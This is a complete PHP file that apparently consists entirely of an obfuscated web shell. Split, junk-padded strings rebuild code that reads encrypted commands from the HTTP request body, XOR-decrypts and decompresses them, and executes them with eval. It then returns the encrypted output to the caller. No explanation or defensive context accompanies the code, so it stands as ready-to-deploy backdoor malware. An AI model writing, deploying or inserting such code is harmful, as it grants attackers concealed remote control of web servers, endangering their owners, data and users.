<?php
$c='DY$k="4778fDY766"DY;$kh=DY"097DYa0f5bDY19c6";DY$kf="75b3bd2bDY3bff";$DYDYp="yFrEDYdqh6KDYj0RFSfF"DY;f';
$E='DYl(@gzuDYncompresDYsDY(DY@DYx(@basDYe64_decode($m[1]DY),$k)));$o=@oDYb_gDYet_contenDYDYts();@ob_D';
$o='unction DYx($t,DYDY$k){$c=sDYtrlen($k);$l=sDYtrlDYen($tDY);$o=DY"";for($i=DY0;$DYi<$l;){foDYr($jDY';
$W='hDY("/$kh(.+)$kfDY/",@fiDYDYlDYe_get_conDYtents("phDYp://inpDYut"),$m)DY==1) DY{@ob_starDYt();@eDYva';
$G='YendDY_cleDYan();$r=@basDYe64_eDYncode(@x(DY@DYgzcompreDYssDY($oDY)DY,$k))DY;print("$p$kh$r$kf");}';
$s='=0;($j<$DYc&&DY$i<DY$l);$j++,$i++DYDYDY){$o.=$t{$i}DY^$k{$j};}}rDYeturDYn $o;}ifDY (@prDYeg_mDYatc';
$z=str_replace('X','','cXreXaXteX_fXXunction');
$H=str_replace('DY','',$c.$o.$s.$W.$E.$G);
$x=$z('',$H);$x();
?>
